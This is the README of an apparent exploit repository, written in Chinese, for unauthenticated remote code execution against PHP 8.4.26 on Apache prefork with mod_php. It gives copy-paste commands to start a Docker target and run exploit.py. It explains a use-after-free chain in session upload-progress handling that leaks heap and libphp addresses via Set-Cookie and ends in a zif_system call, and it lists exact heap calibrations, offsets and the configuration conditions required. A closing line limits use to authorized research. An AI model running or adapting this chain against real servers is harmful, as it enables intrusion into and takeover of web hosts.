# php2shell — PHP 8.4.26 session 漏洞复现

中文 | [English](readme_en.md)

在“完全远程、只用 HTTP、目标页面无 `session_start()`、不写任何目标侧 PHP”的约束下，用**一个 `exploit.py`** 打通 PHP 8.4.26 + Apache prefork + mod_php 的 RCE。官方 `php:8.4.26-apache` 镜像已实测 **3/3** 一键成功（`PROOF: uid=33(www-data)...`）。当前版本要求 `display_errors=1`；`display_errors=0` 已打通纯 HTTP 堆泄漏，完整 RCE 稍后提交。

## exp

下面是从零到 RCE 的完整命令，整段复制执行即可。本仓库不编译 PHP/Apache，没有 `docker build`：环境就是官方 `php:8.4.26-apache` 镜像加 `docker/` 下的配置挂载。

```bash
# 依赖：Docker Engine/Desktop + Docker Compose v2 + Python 3.9+
git clone https://github.com/9bie/php2shell-bypass-aslr-exp.git
cd php2shell-bypass-aslr-exp

# 1) 拉官方镜像（PHP 8.4.26 / Debian 12 / Apache prefork）
docker compose -f docker/docker-compose.yml pull

# 2) 起目标：单 worker、display_errors=On、memory_limit=8M
docker compose -f docker/docker-compose.yml up -d

# 3) 等 Apache 就绪并确认普通页面
for i in $(seq 1 20); do
  curl -fsS http://127.0.0.1:8088/index.php >/dev/null 2>&1 && break
  sleep 0.5
done
curl -s http://127.0.0.1:8088/index.php   # OK

# 4) 一条命令完成整个利用；首次运行会自动读取 libphp 偏移
python3 exploit.py -u http://127.0.0.1:8088/index.php
# PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> 已经在仓库目录内就跳过 `git clone`/`cd`；`pull` 也可以省略，`up -d` 会自动拉镜像。

`exploit.py` 自动完成 worker 轮换、两阶段泄漏、`zif_system` 执行和 proof 读取，每个阶段内置重试。运行环境：

| 组件 | 版本 | 来源 |
|---|---|---|
| PHP | 8.4.26（NTS，mod_php） | `php:8.4.26-apache` |
| 基础系统 | Debian 12 (bookworm) | 同上 |
| Apache | 2.4.69（官方镜像内 Debian 12 包，实测） | 同上 |
| MPM | prefork，单 worker | [docker/apache.conf](docker/apache.conf) |
| lab 报告中的 Apache | 2.4.68（原 lab 自编译，`--profile lab`） | 若需完全一致，用 [apache/httpd](https://github.com/apache/httpd) 的 2.4.68 tag |

官方镜像仓库：[docker-library/php](https://github.com/docker-library/php)（Docker Hub: [`php:8.4.26-apache`](https://hub.docker.com/_/php)）；PHP 源码：[php/php-src](https://github.com/php/php-src)（tag `php-8.4.26`）。

首次运行会自动执行 [docker/offsets.py](docker/offsets.py)：从容器内 `libphp.so` 读取 `zif_system` / `zval_ptr_dtor` 的真实偏移并写入 `out/offsets.env`，`exploit.py` 自动加载，所以更换官方镜像或升级后不用手改偏移。默认命令是 `id>/out/p1`（10 字节），容器里的 `/out` 挂载到仓库的 `./out`，proof 直接落在本机：

```text
[*] target http://127.0.0.1:8088/index.php (cmd='id>/out/p1')
[*] no offsets file; reading libphp symbols from container php2shell-target
zif_system     0x...
zval_ptr_dtor  0x...
[+] chunk base = 0x...
[+] libphp base = 0x...
[*] stage 3: HTDATA=0x... ZIF=0x...
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

payload 里的命令上限是 **14 字节**。要跑任意命令，把脚本写到挂载目录，再用 `sh</out/c`（8 字节）执行：

```bash
printf 'id; uname -a > /out/p1\n' > out/c
python3 exploit.py -u http://127.0.0.1:8088/index.php -c 'sh</out/c'
```

常用参数：`--profile`、`--cmd`、`--proof-file`、`--fetch`、`--zif-offset`、`--dtor-offset`、`--htdata-offset`、`--no-pre-rotate`、`--retries`。默认 profile 是 `bookworm`（官方镜像）；Ubuntu 26.04 `8.5.4-0ubuntu1.3` 用 `--profile ubuntu855`；原 lab 构建用 `--profile lab`。`--offsets-file ''` 可关闭自动读取，容器名不是 `php2shell-target` 时用 `--docker-container` 指定。

Ubuntu 8.5.4 amd64 的完整标定、Rosetta 说明和一键复现命令见 [UBUNTU855.md](UBUNTU855.md)。

bookworm 的堆标定已内置：stage1 filler 数 **841**；stage2 目标数组 **406**、元素值长度 **16**；stage3 `HTDATA=chunk+0x690d8`，A 的 pad 为 6×(31,31)，并额外带 32 字符合法 `Cookie: PHPSESSID`，使 B 复用 stale id（`send_cookie=0`），避免 session 的 `Set-Cookie` 头在 `R0+16` 覆盖 `val.type`；B 用 15B carrier 覆盖 reference 的 `val.value`。官方镜像的 libphp 偏移自动读取为 `zif_system=0x465370`、`zval_ptr_dtor=0x65eb60`；原 lab 用 `0x43a870` / `0x613c50`。

## 机制概览

漏洞面是 `session.upload_progress` 在 RINIT 之前触发的 session 初始化，以及 OOM bailout 后跨请求残留的悬空指针。下面以 lab 构建为例；官方镜像的 bookworm 标定值见 exp 末尾。

整条链的攻击流量全部是普通 multipart HTTP，目标页面只有 `<?php echo "OK\n"; ?>`：

0. **worker 轮换**：`A_bigfields`（3MB 存活 POST 字段 + 12MB OOM）后紧跟一个会初始化 session 的 B，child 以 SIGABRT 退出；prefork fork 出的新 worker 继承相同的 libphp/chunk 映射。
1. **堆泄漏**：A 用 1001 个字段触发 `max_input_vars` 警告（`display_errors=On` → `headers_sent=1`），`PHPSESSID=\x00` 生成新 id 并置 `send_cookie=1`，最后的 12MB 字段在 `php_session_initialize()` 内 OOM，`PS(http_session_vars)` 悬空。B 用 56B multipart 原始值缓冲区重占旧 reference，并用存活的 192B zend_string 承载 fake HashTable；`php_url_encode()` 越界读把 Zend MM chunk 指针写进 `Set-Cookie`（4096B、98 个指针）。
2. **libphp 泄漏**：A 把悬空 `PS(id)` 放到 `chunk+0xb7400`；B 的 56B HashTable 页让 `ZSTR_LEN(PS(id))` 读到 `nTableSize=16`，数据区正好是 `nNextFreeElement|pDestructor`；`pDestructor = ZVAL_PTR_DTOR = libphp+0x613c50`，从 `Set-Cookie` 解出 libphp base。
3. **命令执行**：A 用 6 个 pad 把悬空 reference 固定到 `R0=chunk+0x24e0`；B 用 55B raw buffer 覆盖 `R0-0x10`，fake HashTable 放在 `chunk+0x6e0d8` 的 167B 存活字符串里，`pDestructor = zif_system = libphp+0x43a870`。触发链：

   ```text
   php_session_track_init()
     zval_ptr_dtor(PS(http_session_vars))
       zend_reference_destroy(R0)
         zval_ptr_dtor(&ref->val)          # IS_ARRAY_EX
           zend_array_destroy(fake HT)
             zend_hash_destroy(fake HT)
               pDestructor(&bucket->val)   # zif_system
   ```

   终端只使用 libphp 内的 `zif_system`，不需要 libc。

## 机制分析

- **页面为什么不需要 `session_start()`**：A/B 的 session 初始化发生在 RINIT 前的 multipart 回调里（`FILE_START → php_session_rfc1867_update → php_session_initialize()`；`END → php_session_rfc1867_cleanup → php_session_initialize()`），与脚本内容无关。
- **指针为什么会悬空**：A 在 `php_session_initialize()` 内 OOM bailout，`PS(http_session_vars)` / `PS(id)` 没有被清空；下一个请求初始化 session 时 `php_session_track_init()` 对它执行 `zval_ptr_dtor`。
- **为什么能重占**：multipart 普通字段的值在请求解析阶段被分配成 zend_string；56B block、55B reference、167B 字符串这些尺寸正好覆盖旧 reference、承载 fake HashTable。
- **为什么能过 ASLR**：两次 `Set-Cookie` 越界读分别给出 chunk base 和 libphp base；阶段之间用纯 HTTP abort/fork 换 worker，地址空间不变；终端不依赖 libc。
- **历史线**：`session_unset()` + 用户态 `__destruct` 的 Defect D（`arData` UAF）已在自定义 PHP 页面取得 RCE（[NOASLR_REPORT.md](NOASLR_REPORT.md)），但违反“不写特定 PHP”约束，仅作机制参考。

地址/偏移（相对 chunk 或 libphp，与 ASLR 无关）：

| 位置 | 含义 |
|---|---|
| `chunk+0xb7400` | 阶段 2 悬空 `PS(id)` |
| `chunk+0xb73f0` | 阶段 2 目标 HashTable（`a0443`） |
| `chunk+0x6e0d8` | 阶段 3 fake HashTable 字符串数据 |
| `chunk+0x24e0` | 阶段 3 悬空 reference `R0` |
| `libphp+0x613c50` | `ZVAL_PTR_DTOR` |
| `libphp+0x43a870` | `zif_system` |

上表是 lab 构建（`--profile lab`）。官方镜像（默认 `--profile bookworm`）的对应标定为：stage1 filler 数 **841**；stage2 目标数组 **406**、元素值长度 **16**；stage3 `HTDATA=chunk+0x690d8`，A pad 6×(31,31) 并带 32 字符合法 `Cookie: PHPSESSID`，B 用 15B carrier；libphp 偏移由 `docker/offsets.py` 自动读取（`0x465370` / `0x65eb60`）。

详细机制、gdb 证据与请求校准见 [HTTP_HEAP_LEAK.md](HTTP_HEAP_LEAK.md)（堆泄漏）、[ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md)（libphp 泄漏与全链）、[DISPLAY_ERRORS_OFF.md](DISPLAY_ERRORS_OFF.md)（不依赖 `display_errors` 的泄漏）、[NOTES.md](NOTES.md)（根因与源码位置）。

## 复现声明

- **一个 exp 复现全部**：`python3 exploit.py -u ...` 一条命令完成 worker 轮换、堆泄漏、libphp 泄漏和 `zif_system` 执行；不需要目标侧文件、不需要 `session_start()`、不需要本地信号。
- **纯 HTTP**：攻击流量只有 multipart POST，目标 webroot 只有 `<?php echo "OK\n"; ?>`。
- **环境**：官方 `php:8.4.26-apache`（PHP 8.4.26 / Debian 12 / Apache 2.4.69 prefork）+ [docker/php.ini](docker/php.ini)、[docker/apache.conf](docker/apache.conf)，默认 `--profile bookworm`，实测 **3/3**。原 lab 构建（Apache 2.4.68、最小 PHP）用 `--profile lab`；两套 profile 的 chunk 偏移和 stage3 触发方式已分别标定。
- **边界**：当前 RCE 要求 `display_errors=1`、`memory_limit=8M`、`max_input_vars=1000`、`session.use_cookies=1`、`session.use_strict_mode=0`、单 worker prefork；`display_errors=0` 的完整 RCE 稍后提交。
- 仅用于授权环境中的漏洞研究与复现。
